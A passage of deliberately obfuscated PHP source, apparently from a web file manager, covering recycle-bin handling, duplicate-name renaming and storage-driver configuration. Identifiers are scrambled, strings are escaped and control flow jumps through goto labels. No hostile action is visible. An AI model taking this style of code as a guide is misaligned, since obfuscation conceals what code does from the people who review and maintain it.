$eÜÅ½İ¦’Ñ[$CÈ•´Æªñ´[369]]; self::$cacheSourceInfo[$bÛƒ½ßƒÌˆ] = $eÜÅ½İ¦’Ñ; } return $Có³‡‰ì·£; goto D¹Š‡Å; Fù²ˆÏå¬÷: $CÈ•´Æªñ´ =& $_SERVER[ã®Â„Éæ¹¤]; $bÛƒ½ßƒÌˆ = $CÈ•´Æªñ´[2391] . $F£ğù«’®»; if (isset(self::$cacheChildList[$bÛƒ½ßƒÌˆ])) { return self::$cacheChildList[$bÛƒ½ßƒÌˆ]; } goto dã”®ŠĞ·ø; dã”®ŠĞ·ø: $FŠó›Íòîš = array($CÈ•´Æªñ´[463] => intval($F£ğù«’®»), $CÈ•´Æªñ´[397] => 0); $Có³‡‰ì·£ = $this->where($FŠó›Íòîš)->select(); $Có³‡‰ì·£ = $Có³‡‰ì·£ ? $Có³‡‰ì·£ : array(); goto E·¹İ÷¨÷; D¹Š‡Å: } public function fileNameAuto($b’•İÚºÕ, $AÔÇÕØğç¾, $eĞšõŸ’æÓ = REPEAT_RENAME, $cšÔùê‚• = false) { $f°ÓöÙÍç‰ =& $_SERVER[ã®Â„Éæ¹¤]; $Fòáßƒ¼ İ = $this->childList($b’•İÚºÕ); $F„ä×‚Éò‘ = array_to_keyvalue($Fòáßƒ¼ İ, $f°ÓöÙÍç‰[33], $f°ÓöÙÍç‰[28]); return $this->fileNameAutoGet($F„ä×‚Éò‘, $AÔÇÕØğç¾, $eĞšõŸ’æÓ, $cšÔùê‚•); } public function fileNameAutoGet($bĞ©ğˆÈÄ, $b†¥¼²¿‡Ê, $a°¯âáĞ‹°, $C„È·„áÎ) { $d¥å’á¦¸ƒ =& $_SERVER[ã®Â„Éæ¹¤]; if ($a°¯âáĞ‹° == REPEAT_REPLACE || !$bĞ©ğˆÈÄ || !in_array_not_case($b†¥¼²¿‡Ê, $bĞ©ğˆÈÄ) || $C„È·„áÎ && $a°¯âáĞ‹° != REPEAT_RENAME_FOLDER) { return $b†¥¼²¿‡Ê; } if ($a°¯âáĞ‹° == REPEAT_SKIP) { return !1; } $CÀ²Ğ´»‹ = $d¥å’á¦¸ƒ[91] . get_path_ext($b†¥¼²¿‡Ê); $CÀ²Ğ´»‹ = $CÀ²Ğ´»‹ == $d¥å’á¦¸ƒ[91] || $C„È·„áÎ ? $d¥å’á¦¸ƒ[33] : $CÀ²Ğ´»‹; for ($AªÇ»ÈÈæ = 1; $AªÇ»ÈÈæ <= count($bĞ©ğˆÈÄ) + 1; $AªÇ»ÈÈæ++) { $C“Ã²Ñ¾À‘ = substr($b†¥¼²¿‡Ê, 0, strlen($b†¥¼²¿‡Ê) - strlen($CÀ²Ğ´»‹)); $d…››èº = $C“Ã²Ñ¾À‘ . "\50{$AªÇ»ÈÈæ}\51{$CÀ²Ğ´»‹}"; if (!in_array_not_case($d…››èº, $bĞ©ğˆÈÄ)) { return $d…››èº; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\143\145\137\x72\x65\143\x79\143\154\145"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\x69\x6d\x65", "\x74\151\155\x65", "\x69\x6e\x73\145\162\x74", "\x66\x75\x6e\143\x74\151\157\x6e")); public function listData($Dùõ·Ñ„ôÄ = false) { $aÍ¿ß¡É„ì =& $_SERVER[ã®Â„Éæ¹¤]; $Dùõ·Ñ„ôÄ = $Dùõ·Ñ„ôÄ ? $Dùõ·Ñ„ôÄ : USER_ID; $dœ…¹à„½è = $this->where(array($aÍ¿ß¡É„ì[1447] => $Dùõ·Ñ„ôÄ))->select(); return array_to_keyvalue($dœ…¹à„½è, $aÍ¿ß¡É„ì[33], $aÍ¿ß¡É„ì[369]); } public function moveToRecycle($EÇİÁÄåÂÆ) { goto FìòĞˆ¡Œ; FìòĞˆ¡Œ: $E–÷èÇÍË =& $_SERVER[ã®Â„Éæ¹¤]; $FĞ¤ìœ”ö = Model($E–÷èÇÍË[1136]); $b‘ÕÉ·¯Ş = $FĞ¤ìœ”ö->sourceInfo($EÇİÁÄåÂÆ); goto fÕ¿ˆ×îù¯; Eï¨×Ì®í‘: $this->recycleMove($EÇİÁÄåÂÆ, 1); if ($b‘ÕÉ·¯Ş[$E–÷èÇÍË[370]] == $E–÷èÇÍË[83]) { $Dä‰Ìâ”Š£ = array($E–÷èÇÍË[527] => array($E–÷èÇÍË[485], $b‘ÕÉ·¯Ş[$E–÷èÇÍË[461]] . $EÇİÁÄåÂÆ . $E–÷èÇÍË[486])); $FĞ¤ìœ”ö->where($Dä‰Ìâ”Š£)->setField($E–÷èÇÍË[397], 1); } goto Aæ„—Ã·ğÎ; fÕ¿ˆ×îù¯: if (!$b‘ÕÉ·¯Ş || $b‘ÕÉ·¯Ş[$E–÷èÇÍË[397]] == $E–÷èÇÍË[83]) { return; } $bÜ§Ê‘ã = array($E–÷èÇÍË[383] => $EÇİÁÄåÂÆ, $E–÷èÇÍË[1447] => USER_ID, $E–÷èÇÍË[523] => $b‘ÕÉ·¯Ş[$E–÷èÇÍË[371]], $E–÷èÇÍË[524] => $b‘ÕÉ·¯Ş[$E–÷èÇÍË[458]], $E–÷èÇÍË[527] => $b‘ÕÉ·¯Ş[$E–÷èÇÍË[461]]); $this->add($bÜ§Ê‘ã); goto Eï¨×Ì®í‘; Aæ„—Ã·ğÎ: } public function clear() { $this->remove(!1); } public function remove($BêÓÁ²­˜Ì = false) { goto D§†Ü¾“ß¤; D§†Ü¾“ß¤: $B¸„‰œé¢Ì =& $_SERVER[ã®Â„Éæ¹¤]; $eÊäÌ½ÈÖä = Model($B¸„‰œé¢Ì[1136]); $aÀÀ¢´ï¼Á = $this->listData(); goto eÆ‘ïñĞ²·; eÆ‘ïñĞ²·: $BêÓÁ²­˜Ì = $BêÓÁ²­˜Ì === !1 ? !1 : $BêÓÁ²­˜Ì; $CËŠ¦‹«” = array(); foreach ($aÀÀ¢´ï¼Á as $cÏƒ½ù—„…) { if ($BêÓÁ²­˜Ì != !1 && !in_array($cÏƒ½ù—„…, $BêÓÁ²­˜Ì)) { continue; } $BƒãíÚ§ô– = $eÊäÌ½ÈÖä->sourceInfo($cÏƒ½ù—„…); $eÊäÌ½ÈÖä->remove($cÏƒ½ù—„…, !1); $a®Ô“‹™Å· = $BƒãíÚ§ô–[$B¸„‰œé¢Ì[371]] . $B¸„‰œé¢Ì[70] . $BƒãíÚ§ô–[$B¸„‰œé¢Ì[458]]; $CËŠ¦‹«”[$a®Ô“‹™Å·] = array($B¸„‰œé¢Ì[523] => $BƒãíÚ§ô–[$B¸„‰œé¢Ì[371]], $B¸„‰œé¢Ì[458] => $BƒãíÚ§ô–[$B¸„‰œé¢Ì[458]]); $this->where(array($B¸„‰œé¢Ì[369] => $cÏƒ½ù—„…))->delete(); } goto Aï”ƒˆâ¼¬; Aï”ƒˆâ¼¬: foreach ($CËŠ¦‹«” as $FğË§‘‘Â») { $eÊäÌ½ÈÖä->targetSpaceUpdate($FğË§‘‘Â»[$B¸„‰œé¢Ì[371]], $FğË§‘‘Â»[$B¸„‰œé¢Ì[458]]); } goto bù¬Ø»™ñ; bù¬Ø»™ñ: } public function restore($e»êÒ›ã¦Ÿ = false) { goto bÛŒŞõÜ’Ò; B³óÄù§: foreach ($B­¢Á¢²‰« as $d”„¶„ Ú—) { goto D–ñ…Ìùä©; BğªÕ³ìäœ: if ($d“†‹šœ¿™[$BäÚŒŸâ†ä[397]] == $BäÚŒŸâ†ä[83]) { continue; } $dÜ‚˜±«Ò”->lockMoveStart($d”„¶„ Ú—); $this->recycleMove($d”„¶„ Ú—, 0); goto bğ°ˆ—ò¨÷; D–ñ…Ìùä©: if ($e»êÒ›ã¦Ÿ != !1 && !in_array($d”„¶„ Ú—, $e»êÒ›ã¦Ÿ)) { continue; } $f‘¥ôøëŠ = $dÜ‚˜±«Ò”->sourceInfo($d”„¶„ Ú—); $d“†‹šœ¿™ = $dÜ‚˜±«Ò”->sourceInfo($f‘¥ôøëŠ[$BäÚŒŸâ†ä[463]]); goto BğªÕ³ìäœ; bŠ‚­Ù†ã: $AîëÏùôÇÂ[] = $f‘¥ôøëŠ[$BäÚŒŸâ†ä[463]]; if ($f‘¥ôøëŠ[$BäÚŒŸâ†ä[370]] == $BäÚŒŸâ†ä[83]) { $AîëÏùôÇÂ[] = $d”„¶„ Ú—; } $dÜ‚˜±«Ò”->lockMoveEnd($d”„¶„ Ú—); goto E‰Éáèç‚; bğ°ˆ—ò¨÷: if ($f‘¥ôøëŠ[$BäÚŒŸâ†ä[370]] == $BäÚŒŸâ†ä[83]) { $e Ôèš×æ = array($BäÚŒŸâ†ä[527] => array($BäÚŒŸâ†ä[485], $f‘¥ôøëŠ[$BäÚŒŸâ†ä[461]] . $d”„¶„ Ú— . $BäÚŒŸâ†ä[486])); $dÜ‚˜±«Ò”->where($e Ôèš×æ)->setField($BäÚŒŸâ†ä[397], 0); $this->restoreFolderChildren($d”„¶„ Ú—, $B­¢Á¢²‰«); } $this->where(array($BäÚŒŸâ†ä[369] => $d”„¶„ Ú—))->delete(); $dÜ‚˜±«Ò”->folderSizeReset($f‘¥ôøëŠ[$BäÚŒŸâ†ä[463]]); goto bŠ‚­Ù†ã; E‰Éáèç‚: } $dÜ‚˜±«Ò”->updateModifyTime($AîëÏùôÇÂ); goto B†½ í«áŠ; C•ªÚ÷Ëê: $e»êÒ›ã¦Ÿ = $e»êÒ›ã¦Ÿ == !1 ? !1 : $e»êÒ›ã¦Ÿ; if (!$B­¢Á¢²‰«) { return !0; } $AîëÏùôÇÂ = array(); goto B³óÄù§; bÛŒŞõÜ’Ò: $BäÚŒŸâ†ä =& $_SERVER[ã®Â„Éæ¹¤]; $dÜ‚˜±«Ò” = Model($BäÚŒŸâ†ä[1136]); $B­¢Á¢²‰« = $this->listData(); goto C•ªÚ÷Ëê; B†½ í«áŠ: } private function restoreFolderChildren($cĞï•áôš„, $c‰ÏñŒÉÁö) { goto bï·š×äÑÕ; BáœÒ¯»‰: foreach ($c‰ÏñŒÉÁö as $F…–®Ë³Ø•) { if ($F…–®Ë³Ø• == $cĞï•áôš„) { continue; } if (!$e¦•Ù„»î¶->isParentOf($cĞï•áôš„, $F…–®Ë³Ø•)) { continue; } $BÍ¬ó÷°…Ö = $e¦•Ù„»î¶->sourceInfo($F…–®Ë³Ø•); if ($BÍ¬ó÷°…Ö[$a‰’£Ç[370]] == $a‰’£Ç[83]) { $DÓºÍ‡È¥Õ[] = array($a‰’£Ç[527] => array($a‰’£Ç[485], $BÍ¬ó÷°…Ö[$a‰’£Ç[461]] . $F…–®Ë³Ø• . $a‰’£Ç[486])); } else { $DÓºÍ‡È¥Õ[$a‰’£Ç[369]][1][] = $F…–®Ë³Ø•; } } if (!$DÓºÍ‡È¥Õ[$a‰’£Ç[369]][1]) { unset($DÓºÍ‡È¥Õ[$a‰’£Ç[369]]); } if (!$DÓºÍ‡È¥Õ) { return; } goto eï£·İ¸Èò; eï£·İ¸Èò: $DÓºÍ‡È¥Õ[$a‰’£Ç[369]][1] = array_unique($DÓºÍ‡È¥Õ[$a‰’£Ç[369]][1]); $DÓºÍ‡È¥Õ[$a‰’£Ç[932]] = $a‰’£Ç[2212]; $e¦•Ù„»î¶->where($DÓºÍ‡È¥Õ)->setField($a‰’£Ç[397], 1); goto B÷Œ™ ÄÊ; bï·š×äÑÕ: $a‰’£Ç =& $_SERVER[ã®Â„Éæ¹¤]; $e¦•Ù„»î¶ = Model($a‰’£Ç[1136]); $DÓºÍ‡È¥Õ = array($a‰’£Ç[369] => array($a‰’£Ç[7], array())); goto BáœÒ¯»‰; B÷Œ™ ÄÊ: } private function recycleMove($Dò¹è‡›ƒô, $C’ºß­‰İÙ = 1) { $C½áŒ¼ÜÙ© =& $_SERVER[ã®Â„Éæ¹¤]; $d…ŒË¢½ä = Model($C½áŒ¼ÜÙ©[1136]); $fçÎŠƒÑÖœ = Model($C½áŒ¼ÜÙ©[2413]); $DÛÁÎàÉ‡¯ = array($C½áŒ¼ÜÙ©[369] => $Dò¹è‡›ƒô); if ($C’ºß­‰İÙ) { $d…ŒË¢½ä->where($DÛÁÎàÉ‡¯)->setField($C½áŒ¼ÜÙ©[397], 1); $fçÎŠƒÑÖœ->eventRecycle($Dò¹è‡›ƒô, $C½áŒ¼ÜÙ©[2414]); } else { $Dãƒ³š†ó = $d…ŒË¢½ä->where($DÛÁÎàÉ‡¯)->find(); $Céçó†ÈÜœ = $Dãƒ³š†ó[$C½áŒ¼ÜÙ©[370]] == $C½áŒ¼ÜÙ©[83]; $dÉïİ£ß­… = $d…ŒË¢½ä->fileNameAuto($Dãƒ³š†ó[$C½áŒ¼ÜÙ©[463]], $Dãƒ³š†ó[$C½áŒ¼ÜÙ©[28]], REPEAT_RENAME_FOLDER, $Céçó†ÈÜœ); if ($dÉïİ£ß­… != $Dãƒ³š†ó[$C½áŒ¼ÜÙ©[28]]) { $d…ŒË¢½ä->rename($Dò¹è‡›ƒô, $dÉïİ£ß­…); } $d…ŒË¢½ä->where($DÛÁÎàÉ‡¯)->setField($C½áŒ¼ÜÙ©[397], 0); $fçÎŠƒÑÖœ->eventRecycle($Dò¹è‡›ƒô, $C½áŒ¼ÜÙ©[2415]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\163\x74\157\162\141\x67\x65\114\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\x73\x69\x7a\x65\x4d\x61\170", "\163\171\x73\164\145\155", "\144\145\x66\x61\165\154\164", "\144\x72\x69\x76\x65\162", "\x63\157\x6e\x66\x69\x67"); public function listData($E¹¼¯¡…óÛ = false, $bš¼¤öå£ = "\x6d\x6f\x64\x69\x66\171\124\151\155\145", $f•ïÀÊ³ø¡ = false) { goto b©¬ÚÏÇ¦—; b©¬ÚÏÇ¦—: $fÙÌ™‚šæ =& $_SERVER[ã®Â„Éæ¹¤]; $B£„°ÉçÑ™ = parent::listData($E¹¼¯¡…óÛ, $bš¼¤öå£, $f•ïÀÊ³ø¡); if ($E¹¼¯¡…óÛ) { return $B£„°ÉçÑ™; } goto DÄä‹Œùç³; dî¢Ï‹‹•´: return $B£„°ÉçÑ™; goto CŠÙ‚¶šµß; DÄä‹Œùç³: foreach ($B£„°ÉçÑ™ as $dª’À‹à‚š => $BŠÙø•ƒ„„) { unset($B£„°ÉçÑ™[$dª’À‹à‚š][$fÙÌ™‚šæ[6]]); $B£„°ÉçÑ™[$dª’À‹à‚š][$fÙÌ™‚šæ[2113]] = 0; } $d‚Ó¡æÍ‰ = array_to_keyvalue($B£„°ÉçÑ™, $fÙÌ™‚šæ[33], $fÙÌ™‚šæ[367]); $this->_listAppendSize($B£„°ÉçÑ™, $d‚Ó¡æÍ‰); goto dî¢Ï‹‹•´; CŠÙ‚¶šµß: } public function _listAppendSize(&$Cö©´æ×ä‹, $A°åêõñœ„) { $B¤Ï‹õç±¯ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$A°åêõñœ„) { return; } $c„Û»¦ãÎÅ = $B¤Ï‹õç±¯[2416] . implode($B¤Ï‹õç±¯[47], $A°åêõñœ„) . $B¤Ï‹õç±¯[2417]; $dÀ·„­‡Èµ = Model($B¤Ï‹õç±¯[740])->query($c„Û»¦ãÎÅ); $dÀ·„­‡Èµ = array_to_keyvalue($dÀ·„­‡Èµ, $B¤Ï‹õç±¯[367], $B¤Ï‹õç±¯[77]); foreach ($Cö©´æ×ä‹ as $c…—›‹Òô => $aÔÀ‡·ùñ¤) { $Cö©´æ×ä‹[$c…—›‹Òô][$B¤Ï‹õç±¯[2113]] = isset($dÀ·„­‡Èµ[$aÔÀ‡·ùñ¤[$B¤Ï‹õç±¯[367]]]) ? $dÀ·„­‡Èµ[$aÔÀ‡·ùñ¤[$B¤Ï‹õç±¯[367]]] : 0; } } public function getConfig($e¸¯¿À­ŠÙ) { $Aê°è¡‡ï… = parent::listData($e¸¯¿À­ŠÙ); return json_decode($Aê°è¡‡ï…[$_SERVER[ã®Â„Éæ¹¤][6]], !0); } public function update($aôï°Ÿ¾Œ¿, $cö„á©») { goto Bìª‰§; Bìª‰§: $F’¡´›âÚâ =& $_SERVER[ã®Â„Éæ¹¤]; $c“ÕŸšàê¤ = $cö„á©»[$F’¡´›âÚâ[28]]; $d¸¢¾ï–Ê = array_to_keyvalue(parent::listData(), $F’¡´›âÚâ[28]); goto AÌ†—½¥„‚; E©åÚØŞ÷: $B­ô„™ÀÈ = parent::update($aôï°Ÿ¾Œ¿, $cö„á©»); if ($B­ô„™ÀÈ && $cö„á©»[$F’¡´›âÚâ[34]]) { foreach ($d¸¢¾ï–Ê as $aäç ˆìˆå) { if ($aäç ˆìˆå[$F’¡´›âÚâ[34]] && $aäç ˆìˆå[$F’¡´›âÚâ[367]] != $aôï°Ÿ¾Œ¿) { parent::update($aäç ˆìˆå[$F’¡´›âÚâ[367]], array($F’¡´›âÚâ[34] => 0)); } } } return $B­ô„™ÀÈ; goto D¯Û‹Õ—; AÌ†—½¥„‚: if (isset($d¸¢¾ï–Ê[$c“ÕŸšàê¤]) && $d¸¢¾ï–Ê[$c“ÕŸšàê¤][$F’¡´›âÚâ[367]] != $aôï°Ÿ¾Œ¿) { return !1; } if (isset($cö„á©»[$F’¡´›âÚâ[2418]]) && $cö„á©»[$F’¡´›âÚâ[2418]] == $F’¡´›âÚâ[83]) { $this->checkConfig($cö„á©»); } unset($cö„á©»[$F’¡´›âÚâ[2418]]); goto E©åÚØŞ÷; D¯Û‹Õ—: } public function add($dåìâ°›ç) { goto aƒØ”ÙÎ¤á; aƒØ”ÙÎ¤á: $Dî × æà =& $_SERVER[ã®Â„Éæ¹¤]; $B½É–÷¸” = array_to_keyvalue(parent::listData(), $Dî × æà[28]); if (isset($B½É–÷¸”[$dåìâ°›ç[$Dî × æà[28]]])) { return !1; } goto A ¡„õ²Ğâ; eõ«İ¿ô¹: return $Aç·¢™š‚—; goto BŸÈØÙ•¿Ÿ; A ¡„õ²Ğâ: $this->checkConfig($dåìâ°›ç); $Aç·¢™š‚— = parent::insert($dåìâ°›ç); if ($Aç·¢™š‚— && $dåìâ°›ç[$Dî × æà[34]]) { foreach ($B½É–÷¸” as $CÁ–Ö…ç¬) { if ($CÁ–Ö…ç¬[$Dî × æà[34]]) { parent::update($CÁ–Ö…ç¬[$Dî × æà[367]], array($Dî × æà[34] => 0)); } } } goto eõ«İ¿ô¹; BŸÈØÙ•¿Ÿ: } public function checkConfig(&$c®½ ìª¡Á) { goto aíƒÑó’·–; A‹È¾‰Ÿå: if (in_array($bğÕ´‹…‡ˆ, $bµŠ¯›Ğô¥->objectDriver)) { if (!$bµŠ¯›Ğô¥->isBucketCors() && !$bµŠ¯›Ğô¥->setBucketCors()) { $e™®éÒ¶Œ— = LNG($b¢«¾•‹Ëï[2423]); $e™®éÒ¶Œ— .= $b¢«¾•‹Ëï[2424] . LNG($b¢«¾•‹Ëï[2425]); show_json($e™®éÒ¶Œ—, !1); } } $f¿è²µğ®ç = rtrim($bçæÎ¿¢â‰[$b¢«¾•‹Ëï[1043]], $b¢«¾•‹Ëï[8]) . $b¢«¾•‹Ëï[8]; $FØªÏ¼ÊÚê = $bµŠ¯›Ğô¥->getPath($f¿è²µğ®ç . $b¢«¾•‹Ëï[2008]); goto Fù“ê¿ñ˜™; aíƒÑó’·–: $b¢«¾•‹Ëï =& $_SERVER[ã®Â„Éæ¹¤]; $bğÕ´‹…‡ˆ = strtolower($c®½ ìª¡Á[$b¢«¾•‹Ëï[90]]); $bçæÎ¿¢â‰ = json_decode($c®½ ìª¡Á[$b¢«¾•‹Ëï[6]], !0); goto FŞ¤Æ‘•Á‡; FŞ¤Æ‘•Á‡: foreach ($bçæÎ¿¢â‰ as $Cß Æ¶ñÏ => $f¢ìÚ‰Ã—») { $bçæÎ¿¢â‰[$Cß Æ¶ñÏ] = trim($f¢ìÚ‰Ã—»); } $bçæÎ¿¢â‰[$b¢«¾•‹Ëï[2419]] = rand_string(6); $a ¢£àõÎŠ = $this->driverType($bğÕ´‹…‡ˆ); goto cõééù×’¡; B¾êµë˜³Ê: $c®½ ìª¡Á[$b¢«¾•‹Ëï[90]] = $a ¢£àõÎŠ; return !0; goto Ešã»ğÆá•; cõééù×’¡: $D»±ï¢¾©ê = $b¢«¾•‹Ëï[71] . $a ¢£àõÎŠ; if (!$a ¢£àõÎŠ || !class_exists($D»±ï¢¾©ê)) { write_log(array($b¢«¾•‹Ëï[2420], $c®½ ìª¡Á, get_caller_info()), $b¢«¾•‹Ëï[2421]); show_json($b¢«¾•‹Ëï[2422], !1, $c®½ ìª¡Á); } $bµŠ¯›Ğô¥ = new $D»±ï¢¾©ê($bçæÎ¿¢â‰); goto A‹È¾‰Ÿå; Fù“ê¿ñ˜™: if (!$bµŠ¯›Ğô¥->mkfile($FØªÏ¼ÊÚê)) { show_json(LNG($b¢«¾•‹Ëï[2423]), !1); } $bçæÎ¿¢â‰[$b¢«¾•‹Ëï[1043]] = $f¿è²µğ®ç; $c®½ ìª¡Á[$b¢«¾•‹Ëï[6]] = json_encode($bçæÎ¿¢â‰); goto B¾êµë˜³Ê; Ešã»ğÆá•: } private function driverType($DÍ‹¹ãÚ) { $BëÏÄ®˜‡Ï =& $_SERVER[ã®Â„Éæ¹¤]; $D‘îî«•¿í = array($BëÏÄ®˜‡Ï[102] => $BëÏÄ®˜‡Ï[2426], $BëÏÄ®˜‡Ï[58] => $BëÏÄ®˜‡Ï[2427], $BëÏÄ®˜‡Ï[64] => $BëÏÄ®˜‡Ï[2428]); if (isset($D‘îî«•¿í[$DÍ‹¹ãÚ])) { return $D‘îî«•¿í[$DÍ‹¹ãÚ]; } return strtoupper($DÍ‹¹ãÚ); } public function driverListSystem() { $få‘–ã£ùä =& $_SERVER[ã®Â„Éæ¹¤]; $b¯©Âøñ¸© = parent::listData(); $F‘ª•¹‚œÊ = array(); foreach ($b¯©Âøñ¸© as $eÜØİ°¾ÒÉ) { unset($eÜØİ°¾ÒÉ[$få‘–ã£ùä[187]], $eÜØİ°¾ÒÉ[$få‘–ã£ùä[107]]); $eÜØİ°¾ÒÉ[$få‘–ã£ùä[6]] = json_decode($eÜØİ°¾ÒÉ[$få‘–ã£ùä[6]], !0); $F‘ª•¹‚œÊ[] = $eÜØİ°¾ÒÉ; } return $F‘ª•¹‚œÊ; } public function defaultDriver() { $DœÜ¼Øá±Œ =& $_SERVER[ã®Â„Éæ¹¤]; $dÏÓëÜêÊÓ = parent::listData(); $AÂéÓ˜³™è = array_filter_by_field($dÏÓëÜêÊÓ, $DœÜ¼Øá±Œ[34], 1); $AÂéÓ˜³™è = $AÂéÓ˜³™è[0]; if ($AÂéÓ˜³™è) { $AÂéÓ˜³™è[$DœÜ¼Øá±Œ[6]] = json_decode($AÂéÓ˜³™è[$DœÜ¼Øá±Œ[6]], !0); } return $AÂéÓ˜³™è; } public function driverInfo($CÈ§×¨“†) { $E¥ñÃ¡éóÉ =& $_SERVER[ã®Â„Éæ¹¤]; $bïÕ‹Û®Ÿ½ = array_to_keyvalue(parent::listData(), $E¥ñÃ¡éóÉ[367]); if (!isset($bïÕ‹Û®Ÿ½[$CÈ§×¨“†])) { return !1; } $DŒˆÛ¨­£Š = $bïÕ‹Û®Ÿ½[$CÈ§×¨“†]; $DŒˆÛ¨­£Š[$E¥ñÃ¡éóÉ[6]] = json_decode($DŒˆÛ¨­£Š[$E¥ñÃ¡éóÉ[6]], !0); return $DŒˆÛ¨­£Š; } public function remove($C¨‡å­ãŸÚ) { $this->removeShareItems($C¨‡å­ãŸÚ); return parent::remove($C¨‡å­ãŸÚ); } public function removeWithFile($b°ŒùÛã»÷) { goto DÁÕÚÅÃÅ; D’Úí×÷ö±: $aˆ»¶“²¯->task[$f†‚É§´[720]] = (double) $d¢‡Ø“óÍ; $e±»ç¥Ï†¦ = KodIO::defaultDriver(); $AŠÑå­„š« = $e±»ç¥Ï†¦[$f†‚É§´[367]]; goto Fô·ªõ­ƒ; Fô·ªõ­ƒ: $e¿ÁŠ°Û¿Ì = "\x7b\x69\x6f\x3a{$AŠÑå­„š«}\175\x2f"; $DÀˆœÚ©Õ© = !0; $f‡³¨…Ï…É = array(); goto f•¹—Ó×Õ; BË¢Œ¶ŠÇ: $d¢‡Ø“óÍ = Model($f†‚É§´[422])->where($DĞÛ¡Š‹©­)->sum($f†‚É§´[77]); $dÅÃ¼¥¿¯Ç = $f†‚É§´[2429] . $b°ŒùÛã»÷; $aˆ»¶“²¯ = new TaskFileTransfer($dÅÃ¼¥¿¯Ç, $f†‚É§´[2421], $DÖ™„‘°×—, LNG($f†‚É§´[2430]) . "\x28{$b°ŒùÛã»÷}\51"); goto D’Úí×÷ö±; f§³å÷öá: if (!$DÀˆœÚ©Õ©) { $aˆ»¶“²¯->stop($dÅÃ¼¥¿¯Ç); return !1; } $aˆ»¶“²¯->end(); $this->remove($b°ŒùÛã»÷); goto A¼ŸªŞ‘î; DÁÕÚÅÃÅ: $f†‚É§´ =& $_SERVER[ã®Â„Éæ¹¤]; $DĞÛ¡Š‹©­ = array($f†‚É§´[766] => $b°ŒùÛã»÷); $DÖ™„‘°×— = Model($f†‚É§´[422])->where($DĞÛ¡Š‹©­)->count(); goto BË¢Œ¶ŠÇ; f•¹—Ó×Õ: $aªÂñâËè = Model($f†‚É§´[167])->where($DĞÛ¡Š‹©­)->field($f†‚É§´[2431])->select(); foreach ($aªÂñâËè as $dÇ¶‰†©ê´) { goto e§Ç“èòåß; DöÌšÊÎÁ: $B¥ù¶œïÕÉ = array($f†‚É§´[766] => $AŠÑå­„š«, $f†‚É§´[75] => $D„‹¢Àé”®); Model($f†‚É§´[167])->where($DĞÛ¡Š‹©­)->save($B¥ù¶œïÕÉ); goto dá„³š«Óê; e§Ç“èòåß: $c°Á³²¡ = $dÇ¶‰†©ê´[$f†‚É§´[75]]; $D„‹¢Àé”® = $e¿ÁŠ°Û¿Ì . str_replace("\x7b\x69\157\x3a{$b°ŒùÛã»÷}\x7d\57", $f†‚É§´[33], $c°Á³²¡); if (!IO::exist($c°Á³²¡)) { $f‡³¨…Ï…É[] = $dÇ¶‰†©ê´[$f†‚É§´[419]]; $aˆ»¶“²¯->updateFileEnd($dÇ¶‰†©ê´[$f†‚É§´[28]], $dÇ¶‰†©ê´[$f†‚É§´[77]]); continue; } goto fÁöÉÙ—Ğ; fÁöÉÙ—Ğ: if (IO::exist($D„‹¢Àé”®)) { $aˆ»¶“²¯->updateFileEnd($dÇ¶‰†©ê´[$f†‚É§´[28]], $dÇ¶‰†©ê´[$f†‚É§´[77]]); continue; } if (!IO::move($c°Á³²¡, get_path_father($D„‹¢Àé”®))) { $DÀˆœÚ©Õ© = !1; break; } $DĞÛ¡Š‹©­ = array($f†‚É§´[419] => $dÇ¶‰†©ê´[$f†‚É§´[419]]); goto DöÌšÊÎÁ; dá„³š«Óê: } $this->removeByFileID($f‡³¨…Ï…É); goto f§³å÷öá; A¼ŸªŞ‘î: } public function progress($FÃÉ÷™Ã‘Ù) { return Task::get($_SERVER[ã®Â„Éæ¹¤][2429] . $FÃÉ÷™Ã‘Ù); } private function removeByFileID($Fƒ­§©Äñ² = array()) { goto d†ù¨×åß‡; D©Ã±…ÌÊ¨: $f„„ÄƒÙâÑ = Model($a–ƒÄ×…ÌÑ[1136])->where($cÒİßÔŒ‘»)->field($a–ƒÄ×…ÌÑ[369])->select(); if (!$f„„ÄƒÙâÑ) { return; } $f„„ÄƒÙâÑ = array_to_keyvalue($f„„ÄƒÙâÑ, $a–ƒÄ×…ÌÑ[33], $a–ƒÄ×…ÌÑ[369]); goto DáÔµ‡Ñµ™; DáÔµ‡Ñµ™: foreach ($f„„ÄƒÙâÑ as $F·‰Ù æ©) { Model($a–ƒÄ×…ÌÑ[382])->removeNow($F·‰Ù æ©, !1); } goto aí¨²ñ­ù; d†ù¨×åß‡: $a–ƒÄ×…ÌÑ =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($Fƒ­§©Äñ²)) { return; } $cÒİßÔŒ‘» = array($a–ƒÄ×…ÌÑ[419] => array($a–ƒÄ×…ÌÑ[7], $Fƒ­§©Äñ²)); goto D©Ã±…ÌÊ¨; aí¨²ñ­ù: } private function removeShareItems($E¹ÄåèÔÔ«) { goto bëËÕÙÎËÅ; bëËÕÙÎËÅ: $BáÅ¨Î±‹× =& $_SERVER[ã®Â„Éæ¹¤]; $c¯ø‚ªïµà = "\x7b\151\157\x3a{$E¹ÄåèÔÔ«}\175\57"; $bŠÕİ—¤÷Á = array($BáÅ¨Î±‹×[369] => 0, $BáÅ¨Î±‹×[1038] => array($BáÅ¨Î±‹×[774], "{$c¯ø‚ªïµà}\45")); goto aŞœà°ä´ª; aŞœà°ä´ª: $D©ì²šÊ ‘ = Model($BáÅ¨Î±‹×[2104])->where($bŠÕİ—¤÷Á)->field($BáÅ¨Î±‹×[441])->select(); if (empty($D©ì²šÊ ‘)) { return; } $b½„ÅÔõ « = array_to_keyvalue($D©ì²šÊ ‘, $BáÅ¨Î±‹×[33], $BáÅ¨Î±‹×[441]); goto E•íî‚¹Ú; E•íî‚¹Ú: Model($BáÅ¨Î±‹×[537])->remove($b½„ÅÔõ «); goto bİ¥ÜŸ¦®‘; bİ¥ÜŸ¦®‘: } } goto Bé›¸µÆêÀ; E¤Àë¸ËêÉ: function Action($Dçó£ ‰º = '') { goto Bó²ÀòÚÏß; AÆŠßÕ‡Éà: if (isset($d‰îÛî¤ƒÃ[$Aš–÷ÅÆ¬«])) { return $d‰îÛî¤ƒÃ[$Aš–÷ÅÆ¬«]; } if (is_file($EÚÙ‹ßÌ’¬)) { include_once $EÚÙ‹ßÌ’¬; } if 